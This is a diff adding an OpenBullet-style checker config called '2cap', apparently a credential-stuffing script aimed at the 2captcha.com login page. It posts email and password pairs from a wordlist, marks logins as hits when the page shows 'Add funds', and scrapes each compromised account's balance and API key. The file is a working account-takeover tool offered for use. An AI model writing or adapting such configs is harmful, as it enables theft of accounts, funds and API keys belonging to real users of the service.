@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "2cap",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-29T21:43:21.2592681-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://2captcha.com/auth/login" 
+  CONTENT "authhash=18a03a2c11a9944e52bd7df614535c63&auth_redirect=&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login or password, you" 
+    KEY "Wrong e-mail" 
+  KEYCHAIN Success OR 
+    KEY "Add funds" 
+
+PARSE "<SOURCE>" LR "Balance                            </div>" "/div>" -> VAR "1" 
+
+PARSE "<1>" LR "<b>" "</b>" CreateEmpty=FALSE -> CAP "BALANCE" 
+
+PARSE "<SOURCE>" LR "type=\"text\" id=\"copy_text\" value=\"" "\"" CreateEmpty=FALSE -> CAP "API KEY" 
+
